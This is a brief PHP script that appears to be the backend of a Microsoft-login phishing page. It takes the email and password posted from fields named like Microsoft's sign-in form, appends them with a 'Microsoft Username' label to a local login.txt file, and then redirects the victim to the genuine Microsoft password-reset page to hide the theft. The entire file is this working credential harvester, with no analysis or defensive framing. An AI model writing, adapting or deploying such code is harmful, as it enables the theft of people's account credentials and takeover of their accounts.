<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['loginfmt'] ?? '';
    $pass = $_POST['passwd'] ?? '';

    $log = "Microsoft Username: $email | Pass: $pass\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://account.live.com/ResetPassword.aspx');
    exit();
}
?>
